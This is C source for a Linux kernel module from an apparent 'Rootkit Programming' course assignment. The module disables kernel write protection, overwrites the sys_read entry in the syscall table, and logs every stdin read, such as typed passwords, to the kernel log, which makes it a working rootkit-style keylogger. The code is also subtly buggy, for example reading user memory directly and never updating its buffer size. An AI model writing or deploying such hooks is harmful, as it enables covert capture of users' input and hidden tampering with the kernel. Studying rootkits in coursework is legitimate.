/*  
 *  mod.c - hook stdin
 */
#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif
#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
#include <linux/sched.h>
#include "sysmap.h"
#include <asm/page.h>
#include <asm/pgtable.h>
#include <asm/unistd.h>
#include <asm/processor-flags.h>
#include <linux/string.h>
#include <linux/slab.h>

#define DRIVER_AUTHOR "Rootkit Programming"
#define DRIVER_DESC   "Assigment 1 - 2 System Call Hooking"

void ** syscall_table = (void * *) sys_call_table_R;
ssize_t (*orig_sys_read)(int fd, void *buf, size_t count);
char * buffer;
int r_count=0;

inline void disable_wp(void){
	write_cr0(read_cr0() & ~0x00010000);
}

inline void enable_wp(void){
	write_cr0(read_cr0() | 0x00010000);
}

static ssize_t my_read(int fd, void *buf, size_t count){
	static int buf_size = 0;
	ssize_t retVal;
	r_count++;
	retVal = orig_sys_read(fd, buf, count);
	if(fd == 0){ //stdin
		if(count >= buf_size){
			kfree(buffer);
			buffer = (char *) kmalloc(count+1, GFP_KERNEL);
		}
		if(buffer != NULL){
			strncpy(buffer, (char*)buf, count);
			buffer[count]='\0';
			printk(KERN_INFO "%s\n",buffer);
		}
	}
	r_count--;
	return retVal;
}


static int __init mod_init(void)
{
  disable_wp(); 

  orig_sys_read = syscall_table[__NR_read];
  syscall_table[__NR_read] = my_read;
 
  enable_wp();
  
  return 0;
}

static void __exit mod_exit(void)
{
  disable_wp();
  syscall_table[__NR_read] = orig_sys_read;
  enable_wp();
  kfree(buffer);
  while(r_count > 0){
	printk(KERN_INFO "%d\n", r_count);
  }  
}



module_init(mod_init);
module_exit(mod_exit);

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_LICENSE("GPL");
